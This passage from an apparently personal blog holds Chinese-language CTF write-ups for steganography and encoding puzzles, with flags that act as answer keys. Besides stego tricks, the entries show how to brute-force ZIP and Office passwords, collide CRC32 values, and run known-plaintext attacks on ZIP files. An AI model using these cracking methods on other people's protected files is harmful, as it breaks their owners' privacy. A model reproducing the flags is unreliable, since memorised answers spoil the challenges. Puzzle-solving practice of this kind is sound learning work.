&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;&quot;\n两种编码，自然想到01转二维码\n通过替换得到\n0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100\n转二维码无果\n01还能想到二进制，但直接转二进制存在不可见字符。\n想了好久，看了大佬博客才知道，此处应该将每八位二进制进行反转\ndef bin_to_str(s):    return &#39;&#39;.join([chr(i) for i in [int(b, 2) for b in s.split(&#39; &#39;)]])a &#x3D; &quot;01101100 00101100 00001100 01101100 10011100 10101100 00001100 10000110 10101100 00101100 10001100 00011100 00101100 01000110 00100110 10101100 01100110 10100110 01101100 01000110 01101100 10100110 10101100 01000110 00101100 11000110 10100110 00101100 11001100 00011100 11001100 01001100&quot;a &#x3D; a.split(&#39; &#39;)flag &#x3D; &#39;&#39;for i in a:    test &#x3D; i[::-1]    flag +&#x3D; bin_to_str(test)print flag\n得到\n6406950a54184bd5fe6b6e5b4ce43832\n\n所以到底是谁打的派大星呢？可爱\n\n29\n\n\nIvy给Harley发了一个短信……算了，编不下去了，先听后看就完事了……\n音频解码可能有误差，密码为有意义的无空格小写短句 解密版本为1.25\n\n\nhint:电话音&amp;九宫格\n\n\nFreeFileCamouflage，下载的文件可能显示乱码\n\n根据第一条提示，利用dtmf2num对Heathens.wav进行解码（先截取音频中电话音的部分\n得到\n- DTMF numbers:  #22283344477773338866#\n根据经验，九宫格解码得\nctfisfun\n其中需要自己手动调整部分内容，使其成为有意义的短句\n第二步是下载FreeFileCamouflage，并按照要求输入密码和图片进行解密就好,得flag.txt\nflag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;\n30\n\n\n曹操的私生子曹小明因为爸爸活着的时候得罪太多人，怕死后被抄家，所以把财富保存在一个谁也不知道的地方。曹小明比较喜欢屈原，于是把地点藏在他的诗中。三千年后，小明破译了这个密码，然而却因为担心世界因此掀起战争又亲手封印了这个财富并仿造当年曹小明设下四个可疑文件，找到小明喜欢的DBAPP标记，重现战国辉煌。(答案为正确值(不包括数字之间的空格)的小写32位md5值) 注意：得到的 flag 请包上 flag{} 提交\n\n\n学到了学到了，word还能这样用（脑洞太大了叭\n\n附件得到四个损坏的word，丢进010editor，发现明显的错误\n\n将其修改为F即可正常打开\n里面是屈原的诗。作为一个MISC手，应该看到行距的不同，查看【段落】可知道，有些是单倍行距，有些是1.5倍，进行01的转换\n分别得到由四个word得到的四串数字。按题目要求进行md5加密就好啦\n287b8ceed1c89f1eb1082b3076b7a32159f3bfe7c1e00ba34e4558cf295544bcd473ee3def34bd022f8e5233036b3345\n由于试到第三串的时候正确了，就没有再对D进行处理啦\n31\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢Galaxy师傅供题。\n\n真实脑洞题\n前半部分还是常规操作\n得到【flag.rar】【try to restore it.png】\n对图片进行lsb解密，分别在red通道和blue通道看到东西\nextract后，看到在red为0是藏有一张png\n导出，得到\n\n是【flag.rar】的密码，看来还有压缩包\n对图片查看二进制后，手动分离出一个压缩包，命名为【file.zip】叭\n利用密码!@#$%67*()-+得到【out.txt】\n内容为127，255，63等，类似之前做过的题\n套用脚本\nf &#x3D; open(&quot;attachment.txt&quot;, &quot;r&quot;)s &#x3D; &#39;&#39;tmp &#x3D; &#39;&#39;while 1:    num &#x3D; f.readline()    if not num:        break    if num.rstrip() &#x3D;&#x3D; &#39;63&#39;:        tmp &#x3D; &#39;00&#39;    elif num.rstrip() &#x3D;&#x3D; &#39;127&#39;:        tmp &#x3D; &#39;01&#39;    elif num.rstrip() &#x3D;&#x3D; &#39;191&#39;:        tmp &#x3D; &#39;10&#39;    elif num.rstrip() &#x3D;&#x3D; &#39;255&#39;:        tmp &#x3D; &#39;11&#39;    s +&#x3D; tmpprint snumber &#x3D; &#39;&#39;for i in range(0, len(s), 8):    number +&#x3D; chr(int(s[i:i + 8], 2))print numberf2 &#x3D; open(&#39;1.zip&#39;, &#39;w&#39;)f2.write(number.decode(&#39;hex&#39;))f2.close()import base64f3 &#x3D; open(&#39;flag.txt&#39;, &#39;r&#39;)strs &#x3D; f3.readline()while 1:    strs &#x3D; base64.b64decode(strs)    print strs\n得到\nrar-passwd:0ac1fe6b77be5dbe\n解开【flag.rar】\n得到【fffflag.docx】，全选，上色，得到六行base64编码\n按行解码\n#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-import base64file_path &#x3D; &#39;b641.txt&#39;file &#x3D; open(&#39;b642.txt&#39;, &#39;wb&#39;)for line in open(file_path):    print(line)    b64line &#x3D; base64.b64decode(line)    file.write(b64line)file.close()\n得到(此处为第一行的结果)\n110110111111110011110111111111111111111111111111101110000001111111111001101\n接下来就是脑洞部分了，把1替换为.\n得到\n\nHe1Lo_mi5c~\n32\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢 Iven Huang 师傅供题。\n比赛平台：https://ctfgame.w-ais.cn/\n\n常规题。\n得到一个看似空白的txt文件\n全选能得到长短不一的空格。\n1）长转【-】，短转【.】;由于没有断点，莫斯失败\n2）长转【1】，短转【0】;二进制转ascii，无果\n3）同2），二进制转字符串，得\nwctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;\n33\n\n\n得到的 flag 请包上 flag{} 提交。\n\n啊这，这道题标准misc起手式，修改文件头得写有flag的图片\nutflag&#123;3lit3_h4ck3r&#125;\n34\n\n\n得到的 flag 请包上 flag{} 提交。\n\n一道不算难的misc题\n记得去年遇到过对ppt,word进行爆破的，但当时不知道怎么解。现在知道啦\n得到一个无后缀名的文件，更改其为.ppt得到加密文件\nAccent OFFICE Password Recovery(https://www.52pojie.cn/thread-82569-1-1.html)\n直接爆破得密码【9919】\n\n查看ppt内容，在第7页发现空白字符（被ppt自带的下划线暴露了,上色得flag）\n\nFlag&#123;okYOUWIN&#125;\n35\n\n\n得到的 flag 请包上 flag{} 提交。\n\n这道题也是长见识的\n得到一个加密压缩包和一个word\nword里有隐藏字符\n\n词:lastword\n加密文件夹里有一个同名txt，考虑明文攻击\n有一个问题，如何将word里的隐藏字符做成明文攻击的密钥呢？\n1）选中隐藏字符，右键-&gt;字体-&gt;‘隐藏字符’取消打勾-&gt;复制\n2）直接做成.txt的话没有gbk选项（其他都不行）\n3）大佬做法\n#encoding&#x3D;GBKf &#x3D; open(&quot;test.txt&quot;, &quot;w&quot;)s&#x3D;&quot;Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#39;t contact Violet now. She must be desperate to see me and I don&#39;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don&#39;t play the Hearthstone, and I don&#39;t even know what is Rastakhan&#39;s Rumble.&quot;f.write(s)f.close()\n呱唧呱唧\n接下来就是明文攻击了\n\n得到密钥【My_waifu】\n解开压缩包\nkali解压图片\nzsteg flag.png\n\n\nzsteg安装方法\n\n麻麻我学会啦\n艰辛安装过程从虚拟机连不上网开始\n编辑-&gt;虚拟网络编辑器-&gt;还原默认设置\ngit clone https:&#x2F;&#x2F;github.com&#x2F;zed-0xff&#x2F;zstegcd zsteg&#x2F;gem install zsteg\n安装好之后\nzsteg flag.png\n得到上述flag\n*ctf&#123;vI0l3t_Ev3rg@RdeN&#125;\n36\n\n\n\n得到的 flag 请包上 flag{} 提交。\n\n\n\n学到了零宽度字符隐写https://330k.github.io/misc_tools/unicode_steganography.html\n\n死活看不出来有啥不对的，字频分析也不是。原来用上面的网站就可以啦，有收获一个新工具！\nutflag&#123;whyNOT@sc11_4927aajbqk14&#125;\n37\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢天璇战队供题。\n天璇战队平台：http://ctf.merak.codes/\n\n得到三张图片，查看二进制得到PK字样，但直接分离显示缺少文件尾，仔细观察\n分别存在\n[Secret File Part 1:][Secret File Part 2:][Secret File Part 3:]\n按顺序拼接得到加密压缩包，爆破得密码【1234】\n得到hint.txt\n我用各种baseXX编码把flag套娃加密了，你应该也有看出来。但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过提示：0x10,0x20,0x30,0x55\n根据提示，base16,32,48,85\nflag.txt\nG&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)\n一把梭\nMRCTF&#123;Y0u_Are_4_p3rFect_dec0der&#125;\n38\n\n\n你知道Linux下面有哪些好玩的命令吗？比如sl，还有哪些呢？ 注意：得到的 flag 请包上 flag{} 提交\n\n得到一张图片，png文件的末尾FFD9后一连串不知道是啥的字符\n提取后，\n触及我的知识盲区了\n大佬说是Python Picke序列化内容\n使用pickle脚本load出来\nimport picklefp &#x3D; open(&quot;Untitled1.txt&quot;,&quot;rb+&quot;)fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;)a&#x3D;pickle.load(fp)pickle&#x3D;str(a)fw.write( pickle )fw.close()fp.close()\n得到\n[[(3, &#39;m&#39;), (4, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;&quot;&#39;), (10, &#39;#&#39;), (3\n等\n转换坐标\nfw &#x3D; open(&quot;pickle.txt&quot;,&quot;r&quot;)text&#x3D;fw.read( )i&#x3D;0a&#x3D;0while i&lt;len(text)+1:    if(text[i]&#x3D;&#x3D;&#39;]&#39;):       print(&#39;\\n&#39;)       a&#x3D;0    elif(text[i]&#x3D;&#x3D;&#39;(&#39;):        if(text[i+2]&#x3D;&#x3D;&#39;,&#39;):            b&#x3D;text[i+1]            d&#x3D;text[i+1]            b&#x3D;int(b)-int(a)            c&#x3D;1            while c&lt;b:                print(&quot; &quot;, end&#x3D;&quot;&quot;)                c +&#x3D; 1            print(text[i+5], end&#x3D;&quot;&quot;)            a&#x3D;int(d)        else:            b&#x3D;text[i+1]+text[i+2]            d&#x3D;text[i+1]+text[i+2]            b&#x3D;int(b)-int(a)            c&#x3D;1            while c&lt;b:                print(&quot; &quot;, end&#x3D;&quot;&quot;)                c +&#x3D; 1            print(text[i+6], end&#x3D;&quot;&quot;)            a&#x3D;int(d)    i +&#x3D;1\n得到\n\nflag&#123;a273fdedf3d746e97db9086ebbb195d6&#125;\n39\n\n\n拼在一起解下base64就有flag 注意：得到的 flag 请包上 flag{} 提交\n\n得到68个加密压缩包，\n大佬的crc爆破脚本\nimport zipfileimport stringimport binasciidef CrackCrc(crc):    for i in dic:        for j in dic:            for k in dic:                for h in dic:                    s &#x3D; i + j + k + h                    if crc &#x3D;&#x3D; (binascii.crc32(s.encode())):                        f.write(s)                        returndef CrackZip():        for i in range(0,68):            file &#x3D; &#39;out&#39;+str(i)+&#39;.zip&#39;            crc &#x3D; zipfile.ZipFile(file,&#39;r&#39;).getinfo(&#39;data.txt&#39;).CRC            CrackCrc(crc)dic &#x3D; string.ascii_letters + string.digits + &#39;+&#x2F;&#x3D;&#39;f &#x3D; open(&#39;out.txt&#39;,&#39;w&#39;)CrackZip()print(&quot;CRC32碰撞完成&quot;)f.close\n得到\nz5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA&#x3D;&#x3D;\nbase64解码后能看到file,flag.txt等字样\n010editor的强大体现出来了\nEdit-&gt;Paste from-&gt;Paste from Base64\n再补全文件头526172211A0700\n得到压缩包，附加信息\nflag&#123;nev3r_enc0de_t00_sm4ll_fil3_w1th_zip&#125;\n40\nstegosaurus\n\nhttps://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E5%89%91%E9%BE%99\n\n得到的 flag 请包上 flag{} 提交\n\n\n得到hint.zip和O_O\nhint.zip里有hh.jpg和pwd.txt\n先看pwd.txt\nﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);\nJS隐写，只需要F12打开操作台，console输入，回车后点击小红框框就好啦\n\n(function anonymous() &#123;welcom3!&#125;)\n接下啦对图片进行操作，利用上述密码\n&gt;steghide extract -sf hh.jpgEnter passphrase:wrote extracted data to &quot;secret.txt&quot;.\n想要flag吗？解出我的密文吧~U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;\nBase64开头为Salted,猜测为des解码\n在图片的右键信息里得到密钥@#$%^&amp;%%$)\n得到\nthink about stegosaurus\ngit clone https:&#x2F;&#x2F;github.com&#x2F;AngelKitty&#x2F;stegosaurus.git\n# .&#x2F;stegosaurus -x O_O.pyc Extracted payload: flag&#123;3teg0Sauru3_!1&#125;\n","tags":["MISC"]},{"title":"MISC-image-1","url":"/2020/12/16/MISC-image-1/","content":"image[1]\n\n启示：切忌形成惯性思路\n\n尽管总结有益，亦是为了形成常见的解题思路。尽管浅薄的笔者通过上述几种方法，的确能独立解出一定比例的图像MISC题，但出题者永远比你懂得多、想得多。要学会跳出固定范式，灵活运用！\n\n\n1\nwinhex改变图片规格\n\n\n看不到图？ 是不是屏幕太小了 注意：得到的 flag 请包上 flag{} 提交\n\n此为原始图像👇\n\n观察到大白为半身图，丢进winhex查看，实为png图像没错；结合提示（如果在kali中无法正常浏览图片也可以做接下来的操作），更改图片高度\n#方法如下winhex参数\n更改后保存得👇\n\n出现的问题\n\n途中遇到提示“winhex无法创建，请确定文件夹存在，文件没有收到保护”。查询得-&gt;修改winhex菜单：选项–常规，临时文件目录为XXX，关闭winhex重新打开文件操作即可。\n\n\n在上传的过程中笔者出现图片始终显示不了的问题，在本地也是。调试了多遍发现上传图片的方式大致有转base64和本地使用绝对路径等。\n其中转base不提倡是因为转换之后篇幅太大，即使利用了标签等方式，复制这一项笔者也吃不消。\n本地需要注意几个点：1.图片调用路径不对；2.图片名称不对；3.图片本身的问题；4.图片调用代码问题。（说明：图片调用代码为 img src=“图片地址” alt=“图片说明” ）\n\n2\nStegsolve\n\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n\n此为原始图像👇\n\n观察到此为一普通图像，根据题目提示，执行cmd代码调用Stegsolve-&gt;\njava -jar C:\\Users\\16231\\Desktop\\Stegsolve.jar\n打开需处理的图片后，通过&lt;&gt;调整可观察到👇\n\n\n\n即，在该图像的RED,GREEN,BLUE通道上方出现了与其他图像不同的内容。于是选择操作Analyse-DataExtract👇\n\n通过SaveBin导出flag.png可得👇\n\n通过软件扫描二维码可得cumtctf{1sb_i4_s0_Ea4y}，更改头部得到flag。\n3\nbinwalk查看隐藏文件+压缩包暴力破解\n\n\n人类的科学日益发展，对自然的研究依然无法满足，传闻日本科学家秋明重组了基因序列，造出了名为ningen的超自然生物。某天特工小明偶然截获了日本与俄罗斯的秘密通信，文件就是一张ningen的特写，小明通过社工，知道了秋明特别讨厌中国的六位银行密码，喜欢四位数。你能找出黑暗科学家秋明的秘密么？ 注意：得到的 flag 请包上 flag{} 提交\n\n此为原始图像👇\n日常操作，打开winhex里，观察到其中存在一个ningen.txt👇\n\n再丢进Kali里通过binwalk查看，可观察到其中隐藏着一个zip👇\n\n于是更改文件的后缀名为zip后，打开我们的暴力破解压缩包的软件（如Ziperello）根据提示设置密码为数字，长度为4位，瞬间爆出👇\n\n打开压缩包文件后，输入密码可看到txt文件里的内容，得到flag\n4\n灵活运用常见方法(可能正是因为灵活，才叫爱因斯坦吧)\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n此为原始图像👇\n\n常见思路一：第一步，丢进binwalk查看\n\n发现一个zip文件，第二步：改后缀名，尝试爆破。但由于不知密码结构，只好选择所有打印字符，爆破了好久也无法。只好推翻。\n常见思路二：第一步，丢进winhex。查找关键字flag，只找到加密文件flag.txt，对于密码依旧无法。卒。\n试过了浅薄的笔者会的方法后，一时进入了死胡同。后发现漏了一个简单的细节没有查看-&gt;\n文件属性！！！\n这也是极易被忽略的的一点。\n\n害,这一顿费劲。通过密码解开flag.txt，得到flag即可。\n5\n试别被隐藏的zip文件+认识elf文件\n\n\n感谢 牌森 同学提供题目~\n注意：请将 hctf 替换为 flag 提交，格式 flag{}\n\n此为原始图像👇\n\n丢进Stegsolve,常规操作后可得\n\n查询可知，图中被标记的部分正是zip文件的文件头（学到了\n于是导出save bin为zip文件，压缩包内为一命名为“1”的文件，通过file查看可知此为一elf文件👇\n\n\nelf文件格式：在计算机科学中，是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。\n\n通过strings 1可得flag👇\n\n适当处理后即可。\n6\n基础操作+1\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n\nstrings一下,得二进制👇\n\n二进制转字符串，套flag，搞定！\n启示:这道题的逻辑思路倒很顺。刷题还是不够多，strings作为基础操作，的确是应该想到的。get\n7\n修改文件头\n\n\n得到的 flag 建议用 flag{} 包上提交。\n\n\n丢进winhex,对比手头其他png文件可发现本文件缺少文件头，粘贴缺失部分后另存为.png文件，可得到一张图片👇\n\n将图中十六进制转文本可得flag。\n8\nlinux操作+Brainfuck解密\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n由于此题笔者参考了wp，故在此贴出大佬的解题步骤，在此只记录一些操作\nbinwalk查看可知有一加密压缩包后，binwalk -e分离\n压缩包伪加密可由010editor或winhex修改\n7z XXX -o./可解压得文件\n该题还用到了brainfuck解密\n9\n隐写工具F5-steganography的使用+zip伪加密的破解\n\n\n浏览图片的时候刷新键有没有用呢 注意：得到的 flag 请包上 flag{} 提交\n\nhint提及刷新键，故考虑F5-steganography。\n笔者的kali不知怎么无法git clone，故下载了安装包后启动终端，亦可。\n\n得一txt文件，根据文件头50 4B 03 04，更改后缀名为.zip，发现为加密压缩包。\n更改00 14 00 0X 00为00 14 00 00 00后即可正常打开，得flag。\n10\npython中pillow库的使用\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n这道题真的找了好久，各种方法都试过了，大佬们的方法我愣是复现不了，最终python的pillow库救了我，开整！\nwinhex中看到jpg的文件尾FF D9后出现了大篇幅的数字，观察得最大为f👇\n\n故用脚本将hex转化为ascii\nf1 &#x3D; open(r&#39;C:\\Users\\16231\\Desktop\\ascii1.txt&#39;,&#39;w+&#39;)with open(r&#39;C:\\Users\\16231\\Desktop\\hex.txt&#39;,&#39;r&#39;)as f2:    while 1:        x &#x3D; f2.read(2)        if not x:            break        s &#x3D; &#39;0x&#39; + x        f1.write(chr(int(s,16)))f1.close()\n后通过pillow库成像即可👇\nfrom PIL import Image, ImageDraw, ImageFont, ImageFilterf1 &#x3D; open(r&#39;D:\\0CTF\\BUUCTF\\Misc\\梅花香自苦寒来\\梅花香之苦寒来\\2.txt&#39;,&#39;r&#39;)width &#x3D; 300height &#x3D; 300image &#x3D; Image.new(&#39;RGB&#39;, (width, height), (255, 255, 255))draw &#x3D; ImageDraw.Draw(image)color &#x3D; (0,0,0)while 1:    s &#x3D; f1.readline()    if not s:        break    s &#x3D; s.strip(&#39;\\n&#39;)    s &#x3D; s.lstrip(&#39;(&#39;)    s &#x3D; s.rstrip(&#39;)&#39;)    a &#x3D; int(s.split(&#39;,&#39;)[0],10)    b &#x3D; int(s.split(&#39;,&#39;)[1],10)    draw.point((a, b), fill&#x3D;color)image.show()\n可得一张二维码，扫描得flag。\n11\n\n\n得到的 flag 建议用 flag{} 包上提交。\n开局一张图，flag全靠猜。因为出题人失误搞错了，解出来的key去掉后3位的com\n\n附件为图片，右击属性详情信息有东西。新佛曰开头，解密后得gemlovecom。\n根据提示为gemlove，“猜”故尝试outguess解密：\n\ncat后得flag。\n12\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到一张gakki的照片，\n\n（有时候工具用多了真的很坑，害。尝试第一条路是stegdetect分析，发现为jphide，需要密码，死路）\n\n常规思路，binwalk -e 得到压缩包-》爆破密码8864-》得到txt\n#2V0VI_05X$GygD3*g@gYurMGim#1&#x3D;)D_@Z(JcRevlyGq&amp;N-dgPH8XXSGL&#123;@9&#125;zVmlmxv1vEwbqr)ea!YMI2lznoV_bMrXLbwFrgaiQYfsVN14weObXp)(ybmXjXuTkFuj1pG54!mij1)&#123;41gKmFL&amp;Zgeho01PPEwE&#x3D;r*csndRof$X7JBJ&#x3D;CaNRGMjLY_-GiqlDHWaVk-XZ*8lD5!kLb(OH%8u2LtQXX3QV&#123;1Lh)LyGF#kpV$&#125;GXRKla)u(pw(&amp;ggmYU82HLWhJgngOjhwofkqqC&#123;Hi)g!GXrY6&#x3D;UQGvaeOIrVg*jkGjgGRTY78Ol$w0&amp;tzZ1t&#125;z#_c^t8GrskRcz9YKE_)4B(U$r3qUcCwz4BVq92&amp;0UBaWg#e23&amp;oZ&#125;G(zIl&#x3D;(k&#x3D;^YTlZrQkryM6oW!#-0*&#123;X1oiX4Zwi#jhOUm*aM&#123;NFX-s&#x3D;j2M*S$B_EMkF&#123;R&#x3D;QufYYViOHmNGaDST0e)&#125;w4q8&#123;l(NY)BGCWKiGiM0(o$jPW@b!LeQbRM!k$8H$5z7JhE4aIHM-LsAn_PSSg_&#x3D;lkHmGGok$A$Wrkd^yD9KT#zF-ByEJx-I!g3cZPAv&#123;SkP7zult3NOZ)Kf-Xah)%x3X4kx&#123;SdoYB#icdYmB_T3rggCts^EcZl_R^w-B-B5H&#x3D;4fGRx-IkH59BoB!_&amp;GP)X&#x3D;sYkk&#x3D;Y^Y^YTbodkXQ^vxT&#125;K&#125;#G$Ff&#123;z_(PQFvGiyXIieE4taqmkNln)!g4EkRh@tTjQKB0cfJ!-lAG3%1ihZI$fyXb!Tb09D7G2nuA55GA6A1K&#123;cOiA3e4GuI&#x3D;V3g785Q8mTk&#123;c&amp;&amp;Fk&#125;c51Qh-T9EQf&#123;dYbk&amp;eFc7NI&#123;izbFP9Ycs2PfQcs24gTCY&#123;GG5JoGe@l)QVo$yWXhr%yFQk*&#125;GgCfXFTa(y$99-BDji(-!E$Y$&#123;TD8i6@S(CGt8ZYqXJTwhW&#123;&#125;p(gT8a&amp;L64CC610N$ved&#123;^YDLUK#W9_&#123;x0ZG@sj)_kR&#x3D;ziHM7LlKv8SwZ*e9utoY4ZYf&amp;O(W(Xk_j0(Yi*^QGFUt_PD&#125;NN&#x3D;y&amp;SrY-j77PPyn$GsEmoaN6VKJ&#x3D;j&#123;G#6JHgY(A1$sKX-g9&amp;gigX7d-w*NX&amp;rGN&amp;0tFtQGRkw2J)bH&#123;GPLfFZNE&#x3D;03UmA9nq%FkLH9faebDMl%&#125;\n诸如此类的乱码-》词频分析得到\nGXY&#123;gakiIsMyw1fe&#125;\n13\n\n\n老菜鸡，伤了神，别灰心，莫放弃，试试弱口令 注意：得到的 flag 请包上 flag{} 提交\n\n得到一压缩包，存在注释内容：\n      \t   \t  \t\t\t\t\t  \t \t\t\t \t   \t\t\t\n\n与曾经做过的一个题很像，大意了。\n\n拖入notepad++,得到由→和·组成的摩斯电码\n… . .-… .-… ----- …-. — .-. …- –\nhell0forum\n得到赵丽颖图片👇\n\npng文件考虑lsb隐写。\n下载工具cloacked-pixel-master\npython2 lsb.py extract 1.png new 123456\n弱口令123456后得到文件new\nflag&#123;jsy09-wytg5-wius8&#125;\n14\n\n\n得到的 flag 请包上 flag{} 